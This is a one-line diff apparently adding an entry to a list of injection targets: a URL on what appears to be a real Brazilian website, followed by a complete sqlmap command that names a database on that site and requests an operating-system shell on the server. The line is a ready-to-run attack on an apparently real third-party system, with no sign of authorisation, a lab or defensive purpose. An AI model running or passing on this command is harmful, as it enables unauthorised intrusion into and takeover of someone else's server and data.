@@ -1,0 +1,1 @@
+http://www.easee.com.br/blogdetalhe.asp?idblog=48 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.easee.com.br/blogdetalhe.asp?idblog=48 -D easee1 --os-shell
